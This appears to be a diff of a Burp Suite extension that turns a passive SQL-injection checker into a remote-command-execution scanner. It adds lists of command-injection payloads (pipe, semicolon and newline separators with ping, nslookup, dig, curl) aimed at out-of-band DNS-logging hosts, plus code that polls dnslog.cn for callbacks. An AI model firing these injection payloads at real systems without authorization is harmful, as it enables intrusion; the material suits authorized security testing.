@@ -1,5 +1,5 @@
 # -*-coding:utf-8 -*-
-# 被动扫描注入检测
+# 被动扫描RCE检测
 from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory
 from burp import IScanIssue
 from javax.swing import JMenuItem
@@ -10,68 +10,48 @@ from threading import Thread
 import json
 import os
 from urlparse import urlparse
-import xml
 from collections import OrderedDict
 from queue import Queue
+import requests
 
-# 盲注payload的时间
-TIMEOUT = 8
-
-# XML文件
-PAYLOADS_XML = "payloads/payloads.xml"
-ERROR_REGEXP_XML = "payloads/errors.xml"
+# ip = {}.5xxla4.ceye.io
+# ip = ping {}.5xxla4.ceye.io
+# ip = curl {}.5xxla4.ceye.io
+directPayloads = ['', 'ping', 'curl']
 
 
-# 从xml中读取payload字典当中
-def read_xml_payloads():
-    payloads_dict = OrderedDict()  # payloads
+# ip = 127.0.0.1 | nslookup {}.5xxla4.ceye.io
+# ip = 127.0.0.1 ; nslookup {}.5xxla4.ceye.io
+# ip = 127.0.0.1 '; nslookup {}.5xxla4.ceye.io
+# ip = 127.0.0.1 "; nslookup {}.5xxla4.ceye.io
+# ip = 127.0.0.1 | ping {}.5xxla4.ceye.io
+# ip = 127.0.0.1 & ping {}.5xxla4.ceye.io
+# ip = 127.0.0.1 ; ping {}.5xxla4.ceye.io
+# ip = 127.0.0.1 && ping {}.5xxla4.ceye.io
+# ip = 127.0.0.1 %0a ping {}.5xxla4.ceye.io %0a		# 必须要有空格
+# ip = 127.0.0.1 ";ping {}.5xxla4.ceye.io
+winPayloads = ['| nslookup', '; nslookup', "'; nslookup", '"; nslookup', '| ping', '& ping', '; ping', '&& ping', '%0a ping', '";ping']
 
-    DOMTree = xml.dom.minidom.parse(PAYLOADS_XML)
-    collection = DOMTree.documentElement
 
-    dbms_collection = collection.getElementsByTagName("dbms")
-    for dbms_node in dbms_collection:
-        dbms = str(dbms_node.getAttribute("value"))
-        payloads_dict[dbms] = []
-        payloads = dbms_node.getElementsByTagName('payload')
-        for payload in payloads:
-            payload = payload.getAttribute("value")
-            payloads_dict[dbms].append(payload)
+# ip = 127.0.0.1 | dig vighaw.exeye.io
+# ip = 127.0.0.1 ; dig vighaw.exeye.io
+# ip = 127.0.0.1 '; dig vighaw.exeye.io
+# ip = 127.0.0.1 "; dig vighaw.exeye.io
+# ip = 127.0.0.1 | curl {}.vighaw.exeye.io
+# ip = 127.0.0.1 & curl {}.vighaw.exeye.io
+# ip = 127.0.0.1 ; curl {}.vighaw.exeye.io
+# ip = 127.0.0.1 && curl {}.vighaw.exeye.io
+# ip = 127.0.0.1 %0a curl {}.vighaw.exeye.io %0a
+# ip = 127.0.0.1 ";curl {}.vighaw.exeye.io
 
-    return payloads_dict
+linuxPayloads = ['| dig', "; dig","'; dig", '"; dig', '| curl', '& curl', '; curl', '&& curl', '%0a curl', '";curl']
 
-# 从xml中读取报错规则
-def read_xml_errors():
-    errors_regexp_dict = OrderedDict()  # 报错正则
 
-    DOMTree = xml.dom.minidom.parse(ERROR_REGEXP_XML)
-    collection = DOMTree.documentElement
+headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
 
-    dbms_collection = collection.getElementsByTagName("dbms")
-    for dbms_node in dbms_collection:
-        dbms = str(dbms_node.getAttribute("value"))
-        errors_regexp_dict[dbms] = []
-        error_regexps = dbms_node.getElementsByTagName('error')
-        for each in error_regexps:
-            error_regexp = each.getAttribute("regexp")
-            errors_regexp_dict[dbms].append(error_regexp)
-
-    return errors_regexp_dict
-
-class FuzzSQL:
-    def __init__(self):
-
-        # payloads
-        self.payloads_dict = read_xml_payloads()
-
-        # 报错注入的正则规则
-        self.errors_regexp_dict = read_xml_errors()
 
 class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):
     def registerExtenderCallbacks(self, callbacks):
-
-        self.fuzzSQL = FuzzSQL()
-
         # Required for easier debugging:
         sys.stdout = callbacks.getStdout()
 
@@ -82,13 +62,40 @@ class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory,
         self._helpers = callbacks.getHelpers()
 
         # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。
-        self._callbacks.setExtensionName("Passive SQL Check")
+        self._callbacks.setExtensionName("Passive RCE Check")
 
         # 注册扫描
         callbacks.registerScannerCheck(self)
 
         self.issues = []
-        print 'Load successful\nProject payload from https://github.com/lufeirider/SqlChecker'
+
+        print 'Load successful\n'
+
+    # 获取dnslog地址
+    def get_dnslog(self):
+        getdomain_url = r'http://www.dnslog.cn/getdomain.php'
+        try:
+            res = requests.get(url=getdomain_url, headers=headers)
+            cookies = res.cookies
+            dnslog_domain = res.text  # dnslog地址
+            for cookie in cookies:
+                name, value = cookie.name, cookie.value
+                if name == 'PHPSESSID':
+                    getrecords_cookie = {}
+                    getrecords_cookie[name] = value  # 刷新dnslog所需要的cookies
+                    return getrecords_cookie, dnslog_domain
+        except Exception as e:
+            print('dnslog Address acquisition failed, please re-run the script')  # dnslog地址获取失败，请重新运行脚本
+            os._exit(0)
+
+    # 刷新dnslog，查看是否有数据
+    def records_dnslog(self, random_str):
+        getrecords_url = r'http://www.dnslog.cn/getrecords.php'
+        res = requests.get(url=getrecords_url, cookies=getrecords_cookie, headers=headers)
+        if random_str in res.text:
+            return True
+        else:
+            return False
 
     # 获取请求的url
     def get_request_url(self, protocol, reqHeaders):
@@ -336,7 +343,6 @@ class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory,
 
     def doPassiveScan(self, baseRequestResponse):
         self.start_run(baseRequestResponse)
-        # currentRequestResponse = self.invocation.getSelectedMessages()[0]  # getSelectedMessages()返回IHttpRequestResponse 数组，但有时为1个，有时2个
 
 
 class CustomScanIssue(IScanIssue):
